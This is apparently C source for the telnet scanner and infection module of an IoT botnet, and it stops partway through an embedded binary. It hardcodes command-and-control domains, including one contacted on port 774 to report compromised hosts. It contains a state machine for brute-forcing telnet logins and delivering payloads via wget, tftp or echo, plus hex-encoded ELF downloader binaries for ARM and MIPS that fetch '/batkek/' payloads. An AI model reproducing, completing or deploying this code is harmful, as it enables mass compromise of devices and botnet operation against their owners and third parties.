#define _GNU_SOURCE

/*
    Alot of the code inside this file is ugly but is designed to work and does work.
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <string.h>
#include <netdb.h>

#include "headers/includes.h"
#include "headers/entry.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/check_sum.h"
#include "headers/resolve.h"

char *arm_bins[] = {"arm", "arm7", 0};

char *tmp_dirs[] = {"/tmp/", "/var/", "/dev/", "/mnt/", "/var/run/", "/var/tmp/", "/", 
		"/dev/netslink/", "/dev/shm/", "/bin/", "/etc/", "/boot/", "/usr/", "/sys/", 0};

char *domain = "suckmyass.cf"; //should probably use a xor entry for this later

int rsck = 0;
int rsck_out = 0;
char scanner_raw_buf[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct scanner_struct_t *conn_table;
uint16_t max_weight = 0;
uint32_t fake_time = 0;
static struct telnet_login_t *start;
static struct telnet_login_t *current;
static struct telnet_prompts_t *s;
static struct telnet_prompts_t *c;
uint8_t retrbin_count = 8;
uint16_t max_credentials = 0;

static int compare_telnet_prompts(int, struct scanner_struct_t *);
static char *get_victim_host(struct scanner_struct_t *);
static void load_login(int, char *, char *);
static void init_logins(void);

static void report_working(char *msg)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

//	printf("1\n");
    if(pid > 0 || pid == -1)
    {
        return;
    }
	
//	printf("2\n");
    if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        exit(0);
    }

//	printf("3\n");
    addr.sin_family = AF_INET;
    //addr.sin_addr.s_addr = htonl(getHostByName("gfg.teamtnt.red"));
     addr.sin_addr.s_addr = getHostByName("gfg.teamtnt.red");
	addr.sin_port = htons(774);

//	printf("4\n");
    if(connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        exit(0);
    }
	
//	printf("5\n");

    util_send(fd, "[telnet] %s", msg);

//	printf("6\n");

    close(fd);
    exit(0);
}

enum
{
    ENDIAN_LITTLE = 1,
    ENDIAN_BIG = 2,
    MAX_ECHO_BYTES = 128,
    //TOTAL_ALLOWED_LOGIN_ATTEMPTS = 20,
    // Cases corresponding to their suited number
    SETUP_TELNET_CONNECTION = 0,
    VALIDATE_CONNECTION_STATUS = 1,
    READ_USERNAME_PROMPT = 2,
    READ_PASSWORD_PROMPT = 3,
    READ_FAIL_OR_SUCCESS = 4,
    READ_QUERY_RESPONSE = 5,
    READ_INFECT_RESPONSE = 6,
    READ_ELF_FEEDBACK = 7,
    FIND_WRITE_DIR = 8,
    SUBMIT_WGET_PAYLOAD = 9,
    SUBMIT_TFTP_PAYLOAD = 10,
    SUBMIT_ECHO_PAYLOAD = 11,
    READ_ECHO_FEEDBACK = 12,
    RUN_ECHO_PAYLOAD = 13,
    READ_ECHO_DEPLOY_FEEDBACK = 14,
    READ_WGET_TFTP_DEPLOY_FEEDBACK = 15,
    SCANNER_MAX_CONNS = 558,
    SCANNER_RAW_PPS = 590,
    SOCKBUF_SIZE = 1024,
    SCANNER_HACK_DRAIN = 256,
    // Prompt ids
    TELNET_LOGIN_PROMPTS = 1,
    TELNET_FAIL_PROMPTS = 2,
    TELNET_SUCCESS_PROMPTS = 3,
    TELNET_FAIL_OR_SUCCESS_PROMPTS = 4,
};

typedef enum
{
    ARCH_ARM = 0x28,
    ARCH_ARM7 = 0xA7,
    ARCH_MIPS = 0x08,
    ARCH_PPC = 0x14,
    ARCH_SUPERH = 0x2A,
    ARCH_M68K = 0x04,
    ARCH_SPARC = 0x02,
} arch_type;

struct parsed_elf_t
{
    arch_type arch;
    uint32_t endianness;
};

struct retrieve_bin_t
{
    arch_type arch;
    uint32_t endianness;
    char *binary;
    uint32_t binary_len;
    char **retr_lines;
    uint32_t retr_line_num;
};

struct telnet_login_t
{
    int weight;
    int index;
    char *username;
    char *password;
    uint8_t username_len;
    uint8_t password_len;
    uint16_t weight_min;
    uint16_t weight_max;
    struct telnet_login_t *next;
};

struct telnet_prompts_t
{
    int id;
    char *str;
    struct telnet_prompts_t *next;
};

struct retrieve_bin_t retr_bins[8] =
{
    { ARCH_ARM,    ENDIAN_LITTLE,  "\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x38\x81\x00\x00\x34\x00\x00\x00\x14\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xf4\x02\x00\x00\xf4\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xf4\x02\x00\x00\xf4\x02\x01\x00\xf4\x02\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x83\x00\x00\xea\x01\x00\x90\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x7f\x00\x00\xea\x06\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x78\x00\x00\xea\x05\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x03\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x70\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x67\x00\x00\xea\x04\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x60\x00\x00\xea\x03\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x01\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x58\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\xf0\x41\x2d\xe9\x30\xc1\x9f\xe5\x94\xd0\x4d\xe2\x00\x00\x00\xea\x01\xc0\x8c\xe2\x00\x60\xdc\xe5\x00\x00\x56\xe3\xfb\xff\xff\x1a\x14\x31\x9f\xe5\x0c\x80\x63\xe0\x50\x30\xa0\xe3\x83\x30\xcd\xe5\x08\x31\x9f\xe5\x02\x40\xa0\xe3\x04\x11\x9f\xe5\x04\x21\x9f\xe5\x04\x01\x9f\xe5\x84\x30\x8d\xe5\x80\x40\xcd\xe5\x81\x60\xcd\xe5\x82\x60\xcd\xe5\xc0\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x04\x00\xa0\xe1\xda\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00\x50\xa0\xe1\x01\x00\xa0\x03\xae\xff\xff\x0b\x05\x00\xa0\xe1\x80\x10\x8d\xe2\x10\x20\xa0\xe3\xb9\xff\xff\xeb\x00\x00\x50\xe3\x00\x00\x60\xb2\xa7\xff\xff\xbb\x19\x40\x88\xe2\x05\x00\xa0\xe1\xa4\x10\x9f\xe5\x04\x20\xa0\xe1\xbb\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0\x13\x9f\xff\xff\x1b\x06\x40\xa0\xe1\x93\x10\x8d\xe2\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xba\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\x97\xff\xff\x1b\x93\x30\xdd\xe5\x04\x44\x83\xe1\x68\x30\x9f\xe5\x03\x00\x54\xe1\xf3\xff\xff\x1a\x0d\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xae\xff\xff\xeb\x00\x20\x50\xe2\x0d\x40\xa0\xe1\x0d\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\xa1\xff\xff\xeb\xf4\xff\xff\xea\x05\x00\xa0\xe1\x89\xff\xff\xeb\x07\x00\xa0\xe1\x87\xff\xff\xeb\x05\x00\xa0\xe3\x81\xff\xff\xeb\x94\xd0\x8d\xe2\xf0\x81\xbd\xe8\xcc\x82\x00\x00\x45\x1e\xc4\x7e\x41\x02\x00\x00\xff\x01\x00\x00\xd0\x82\x00\x00\xd4\x82\x00\x00\x0a\x0d\x0a\x0d\x70\x40\x2d\xe9\x10\x40\x8d\xe2\x70\x00\x94\xe8\x71\x00\x90\xef\x01\x0a\x70\xe3\x00\x40\xa0\xe1\x70\x80\xbd\x98\x03\x00\x00\xeb\x00\x30\x64\xe2\x00\x30\x80\xe5\x00\x00\xe0\xe3\x70\x80\xbd\xe8\x00\x00\x9f\xe5\x0e\xf0\xa0\xe1\xf4\x02\x01\x00\x61\x72\x6d\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x61\x72\x6d\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\x58\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xcc\x82\x00\x00\xcc\x02\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xf4\x02\x01\x00\xf4\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf4\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 988,  0 },
    { ARCH_ARM7,   ENDIAN_LITTLE,  "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\xe4\x81\x00\x00\x34\x00\x00\x00\x34\x04\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x04\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xdc\x03\x00\x00\xdc\x03\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xdc\x03\x00\x00\xdc\x03\x01\x00\xdc\x03\x01\x00\x10\x00\x00\x00\x10\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x07\x00\x00\x00\xdc\x03\x00\x00\xdc\x03\x01\x00\xdc\x03\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x01\x00\xa0\xe3\x9a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x06\x00\xa0\xe3\x92\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x05\x00\xa0\xe3\x87\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00\x9f\xe5\x7c\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x1b\x01\x00\x00\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x04\x00\xa0\xe3\x70\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x03\x00\xa0\xe3\x65\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x0c\x00\x9f\xe5\x5a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x19\x01\x00\x00\xf0\x41\x2d\xe9\x30\x31\x9f\xe5\x98\xd0\x4d\xe2\x00\x40\xa0\xe3\x00\x00\x00\xea\x01\x40\x84\xe2\x01\x60\x53\xe5\x00\x00\x56\xe3\x01\x30\x83\xe2\xfa\xff\xff\x1a\x10\x31\x9f\xe5\x88\x30\x8d\xe5\x02\x30\xa0\xe3\x08\x11\x9f\xe5\x08\x21\x9f\xe5\xb4\x38\xcd\xe1\x04\x01\x9f\xe5\x05\x3a\xa0\xe3\xb6\x38\xcd\xe1\xb2\xff\xff\xeb\x01\x10\xa0\xe3\x00\x70\xa0\xe1\x06\x20\xa0\xe1\x02\x00\xa0\xe3\xda\xff\xff\xeb\x01\x00\x70\xe3\x01\x00\x77\x13\x00\x50\xa0\xe1\x01\x00\xa0\x03\x98\xff\xff\x0b\x05\x00\xa0\xe1\x84\x10\x8d\xe2\x10\x20\xa0\xe3\xaf\xff\xff\xeb\x00\x00\x50\xe3\x00\x00\x60\xb2\x91\xff\xff\xbb\x19\x40\x84\xe2\x05\x00\xa0\xe1\xac\x10\x9f\xe5\x04\x20\xa0\xe1\xb3\xff\xff\xeb\x04\x00\x50\xe1\x03\x00\xa0\x13\x89\xff\xff\x1b\x98\x80\x9f\xe5\x06\x40\xa0\xe1\x97\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xb4\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\x7f\xff\xff\x1b\x97\x30\xdd\xe5\x04\x44\x83\xe1\x08\x00\x54\xe1\xf4\xff\xff\x1a\x04\x40\x8d\xe2\x04\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xa8\xff\xff\xeb\x00\x20\x50\xe2\x04\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\x98\xff\xff\xeb\xf5\xff\xff\xea\x05\x00\xa0\xe1\x76\xff\xff\xeb\x07\x00\xa0\xe1\x74\xff\xff\xeb\x05\x00\xa0\xe3\x6a\xff\xff\xeb\x98\xd0\x8d\xe2\xf0\x41\xbd\xe8\x1e\xff\x2f\xe1\xb1\x83\x00\x00\x45\x1e\xc4\x7e\x41\x02\x00\x00\xff\x01\x00\x00\xb8\x83\x00\x00\xbc\x83\x00\x00\x0a\x0d\x0a\x0d\x00\x00\x00\x00\x0d\xc0\xa0\xe1\xf0\x00\x2d\xe9\x00\x70\xa0\xe1\x01\x00\xa0\xe1\x02\x10\xa0\xe1\x03\x20\xa0\xe1\x78\x00\x9c\xe8\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x0e\xf0\xa0\x31\xff\xff\xff\xea\x04\xe0\x2d\xe5\x1c\x20\x9f\xe5\x00\x30\xa0\xe1\x02\x20\x9f\xe7\x06\x00\x00\xeb\x00\x30\x63\xe2\x02\x30\x80\xe7\x00\x00\xe0\xe3\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x64\x80\x00\x00\x00\x00\x00\x00\x0f\x0a\xe0\xe3\x1f\xf0\x40\xe2\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x61\x72\x6d\x37\x00\x00\x00\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x61\x72\x6d\x37\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00\x01\x09\x00\x00\x00\x06\x02\x08\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x74\x62\x73\x73\x00\x2e\x67\x6f\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xc0\x80\x00\x00\xc0\x00\x00\x00\xf0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xb0\x83\x00\x00\xb0\x03\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x04\x00\x00\xdc\x03\x01\x00\xdc\x03\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\xdc\x03\x01\x00\xdc\x03\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x24\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xec\x03\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1356, 0 },
    { ARCH_MIPS,   ENDIAN_BIG,     "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x01\xe8\x00\x00\x00\x34\x00\x00\x05\xd0\x00\x00\x10\x07\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x05\x4c\x00\x00\x05\x4c\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x05\x50\x00\x44\x05\x50\x00\x44\x05\x50\x00\x00\x00\x4c\x00\x00\x00\x60\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x84\xa0\x03\x99\xe0\x21\x8f\x99\x80\x54\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa1\x3c\x1c\x00\x05\x27\x9c\x84\x84\x03\x99\xe0\x21\x8f\x99\x80\x54\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa6\x3c\x1c\x00\x05\x27\x9c\x84\x68\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x54\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa5\x3c\x1c\x00\x05\x27\x9c\x84\x40\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x54\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x83\xf4\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x54\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa4\x3c\x1c\x00\x05\x27\x9c\x83\xcc\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x54\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa3\x3c\x1c\x00\x05\x27\x9c\x83\xa4\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x54\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x01\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x83\x58\x03\x99\xe0\x21\x27\xbd\xff\x40\xaf\xbf\x00\xbc\xaf\xb2\x00\xb8\xaf\xb1\x00\xb4\xaf\xb0\x00\xb0\xaf\xbc\x00\x10\x03\xe0\x00\x21\x04\x11\x00\x01\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x83\x28\x03\x9f\xe0\x21\x00\x00\xf8\x21\x8f\x82\x80\x18\x00\x00\x00\x00\x24\x50\x05\x20\x82\x02\x00\x00\x00\x00\x00\x00\x14\x40\xff\xfd\x26\x10\x00\x01\x26\x10\xff\xff\x24\x02\x00\x02\xa7\xa2\x00\x1c\x24\x02\x00\x50\xa7\xa2\x00\x1e\x3c\x02\x45\x1e\x34\x42\xc4\x7e\x8f\x84\x80\x18\xaf\xa2\x00\x20\x8f\x82\x80\x18\x8f\x99\x80\x58\x24\x84\x05\x28\x24\x05\x03\x01\x24\x06\x01\xff\x24\x42\x05\x20\x03\x20\xf8\x09\x02\x02\x80\x23\x8f\xbc\x00\x10\x24\x04\x00\x02\x8f\x99\x80\x48\x24\x05\x00\x02\x00\x00\x30\x21\x03\x20\xf8\x09\x00\x40\x90\x21\x00\x40\x88\x21\x24\x02\xff\xff\x8f\xbc\x00\x10\x12\x22\x00\x03\x00\x00\x00\x00\x16\x42\x00\x07\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x01\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x40\x02\x20\x20\x21\x27\xa5\x00\x1c\x03\x20\xf8\x09\x24\x06\x00\x10\x8f\xbc\x00\x10\x04\x41\x00\x07\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x02\x20\x23\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x85\x80\x18\x8f\x99\x80\x44\x26\x10\x00\x19\x24\xa5\x05\x2c\x02\x20\x20\x21\x03\x20\xf8\x09\x02\x00\x30\x21\x8f\xbc\x00\x10\x10\x50\x00\x07\x00\x00\x80\x21\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x00\x00\x80\x21\x8f\x99\x80\x38\x02\x20\x20\x21\x27\xa5\x00\x18\x03\x20\xf8\x09\x24\x06\x00\x01\x8f\xbc\x00\x10\x24\x03\x00\x01\x8f\x99\x80\x4c\x10\x43\x00\x04\x24\x04\x00\x04\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x83\xa3\x00\x18\x00\x10\x12\x00\x00\x43\x80\x25\x3c\x02\x0d\x0a\x34\x42\x0d\x0a\x16\x02\xff\xed\x00\x00\x00\x00\x8f\x99\x80\x38\x27\xb0\x00\x2c\x02\x20\x20\x21\x02\x00\x28\x21\x03\x20\xf8\x09\x24\x06\x00\x80\x8f\xbc\x00\x10\x02\x00\x28\x21\x8f\x99\x80\x44\x00\x40\x30\x21\x18\x40\x00\x06\x02\x40\x20\x21\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x10\x00\xff\xf0\x00\x00\x00\x00\x8f\x99\x80\x50\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x20\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x50\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x40\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x05\x8f\xbc\x00\x10\x8f\xbf\x00\xbc\x8f\xb2\x00\xb8\x8f\xb1\x00\xb4\x8f\xb0\x00\xb0\x03\xe0\x00\x08\x27\xbd\x00\xc0\x3c\x1c\x00\x05\x27\x9c\x81\x00\x03\x99\xe0\x21\x00\x80\x10\x21\x00\xa0\x20\x21\x00\xc0\x28\x21\x00\xe0\x30\x21\x8f\xa7\x00\x10\x8f\xa8\x00\x14\x8f\xa9\x00\x18\x8f\xaa\x00\x1c\x27\xbd\xff\xe0\xaf\xa8\x00\x10\xaf\xa9\x00\x14\xaf\xaa\x00\x18\xaf\xa2\x00\x1c\x8f\xa2\x00\x1c\x00\x00\x00\x0c\x14\xe0\x00\x03\x27\xbd\x00\x20\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x40\x20\x21\x8f\x99\x80\x3c\x00\x00\x00\x00\x03\x20\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x90\x03\x99\xe0\x21\x27\xbd\xff\xe0\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x34\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f\xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x40\x03\x99\xe0\x21\x8f\x82\x80\x30\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d\x69\x70\x73\x00\x00\x00\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x6d\x69\x70\x73\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x05\xa0\x00\x40\x05\x00\x00\x40\x01\x74\x00\x40\x04\xb0\x00\x40\x01\x00\x00\x40\x01\x4c\x00\x40\x01\x9c\x00\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x04\x40\x00\x40\x00\xd8\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\